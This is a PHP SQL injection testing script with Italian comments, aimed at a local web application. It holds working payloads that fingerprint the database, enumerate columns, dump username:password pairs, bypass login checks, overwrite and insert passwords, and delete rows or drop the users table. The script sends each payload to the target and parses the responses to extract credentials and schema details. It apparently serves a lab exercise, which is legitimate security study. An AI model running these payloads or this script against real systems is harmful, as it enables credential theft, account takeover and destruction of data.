<?php
// sqli_test.php

$target = "http://localhost:8080/index.php";

$payloads = [
    // Raccogliere informazioni sulla struttura del DB o sulla sua configurazione
    "' UNION SELECT 1,version(),3-- -",
    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -",

    //Esfiltrare dati contenuti in una o più tabelle del database
    "' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -",
    "' OR 'a'='a' UNION SELECT 1,'admin','password'-- -",
    "' OR 1=1-- ",
    "' OR '1'='1'-- ",

    //Modificare il contenuto del database
    "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --",
    "'; UPDATE users SET password='123456' WHERE id=2; --",
    "'; UPDATE users SET password=CONCAT(password, '_changed') WHERE username='user3'; --",
    "'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123'); --",

    //Cancellare una o più tabelle o righe del database
    "'; DELETE FROM users WHERE username='user10'; --",
    "'; DELETE FROM users WHERE username LIKE 'user%'; --",
    "'; DROP TABLE users; --",
];

//loop sui payloads
foreach ($payloads as $payload) {

    //Costruzione URL con input vulnerabile
    $username = urlencode($payload);
    $password = urlencode($payload);
    $url = "{$target}?username={$username}&password={$password}";
    //Invio richiesta al server con i payload
    echo "\n[+] Testando: {$payload}\n";
    $response = @file_get_contents($url);

    //Se la risposta non arriva stampa errore e passa al payload successivo
    if ($response === false) {
        echo "[-] Errore connessione\n";
        continue;
    }

    // Rilevamento errori SQL classici nella risposta
    if (strpos($response, "SQL syntax") !== false || strpos($response, "mysql_fetch_array") !== false) {
        echo "[!] Errore SQL rilevato - Possibile vulnerabilità\n";
    }

    //Verifica se la risposta contiene il marcatore "ID:", quindi qualcosa è stato restituito dal DB
    if (strpos($response, "ID:") !== false) {
        // Se payload contiene "version()"
        if (strpos($payload, "version()") !== false) {
            echo "[!] VULNERABILE!\n";

            //Estraggo una porzione utile della risposta e rimuovo i tag HTML per analisi più semplice
            $snippet = substr($response, strpos($response, "ID:"), 200);
            $clean_snippet = trim(strip_tags($snippet));

            //Uso una regex per cercare una stringa con "Utente: <valore>" o "ID:..." contenente la versione del DB
            if (preg_match('/Utente:\s*([^\s<]+)/i', $clean_snippet, $matches)) {
                echo "    Versione: {$matches[1]}\n";
            } elseif (preg_match('/ID:\s*\d+.*?([\d.]+)/', $clean_snippet, $matches)) {
                echo "    Versione: {$matches[1]}\n";
            } else {
                echo "    Versione non trovata\n";
            }
        
        //Se è un payload con UNION SELECT, vengono analizzati dati restituiti, come nomi di colonne o user/pass
        } elseif (preg_match("/(?i)\bUNION\b\s+SELECT\b/", $payload)) {
            echo "[!] VULNERABILE!\n";

            $snippet = substr($response, strpos($response, "ID:"), 2000); // estendi per più dati
            $clean_snippet = trim(strip_tags($snippet));

            // Dividi snippet in righe basandoti su "ID:" per separare record
            $lines = preg_split('/(?=ID:)/i', $clean_snippet);
            $filtered = [];

            //Scarta righe HTML o script inutili per isolare solo dati interessanti (es. risultati query)
            foreach ($lines as $line) {
                $line = trim($line);
                // Filtra righe JS/HTML o vuote
                if (
                    stripos($line, 'const ') === 0 ||
                    stripos($line, 'function') !== false ||
                    stripos($line, 'document.getElementById') !== false ||
                    preg_match('/<[^>]+>/', $line) ||
                    $line === ''
                ) {
                    continue;
                }
                $filtered[] = $line;
            }

            // Se stai estraendo colonne da information_schema.columns
            if (strpos($payload, "column_name") !== false) {
                $found = [];
                foreach ($filtered as $line) {
                    // Estraggo nomi colonne, assumendo appaiono dopo "Utente:" o come parole maiuscole
                    if (preg_match_all('/Utente:\s*([A-Z0-9_]+)/i', $line, $column_matches)) {
                        $found = array_merge($found, $column_matches[1]);
                    } else {
                        // In alternativa, prendi tutta la linea che sembra una colonna
                        $found[] = $line;
                    }
                }

                if (!empty($found)) {
                    echo "    Colonne trovate:\n";
                    foreach (array_unique($found) as $col) {
                        echo "    - $col\n";
                    }
                } else {
                    echo "    Nessuna colonna trovata nel frammento.\n";
                }
            } elseif (strpos($payload, "CONCAT") !== false) {
                // Stampo i dati utente:password estratti, meglio formattati
                echo "    Dati utente e password trovati:\n";
                foreach ($filtered as $line) {
                    // Estraggo la parte dopo "Utente:" o ID: per mostrare solo user:pass
                    if (preg_match('/Utente:\s*(.+)/i', $line, $matches)) {
                        echo "    - " . trim($matches[1]) . "\n";
                    } else {
                        echo "    - $line\n";
                    }
                }
            } else {
                echo "    Dati trovati (snippet risposta):\n";
                foreach ($filtered as $line) {
                    echo "    - $line\n";
                }
            }

        } else {
            echo "[!] VULNERABILE!\n";
            preg_match_all('/<div class="error".*?>(.*?)<\/div>/s', $response, $matches);

            if (!empty($matches[1])) {
                foreach ($matches[1] as $result) {
                    if (strpos($result, "Credenziali non valide") === false) {
                        echo "    " . trim(strip_tags($result)) . "\n";
                    }
                }
            } else {
                $snippet = substr($response, strpos($response, "ID:"), 200);
                $clean_snippet = trim(strip_tags($snippet));

                $lines = explode("\n", $clean_snippet);
                $filtered = [];

                foreach ($lines as $line) {
                    $line = trim($line);
                    if (
                        stripos($line, 'const ') === 0 ||
                        stripos($line, 'function') !== false ||
                        stripos($line, 'document.getElementById') !== false ||
                        preg_match('/<[^>]+>/', $line)
                    ) {
                        continue;
                    }
                    if ($line !== "") {
                        $filtered[] = $line;
                    }
                }

                echo "    Dati trovati (snippet risposta):\n";
                foreach ($filtered as $line) {
                    echo "    - $line\n";
                }
            }
        }
    } else {
        echo "[-] Nessun risultato visibile\n";
    }

    echo "-----------------------------\n";
}
?>
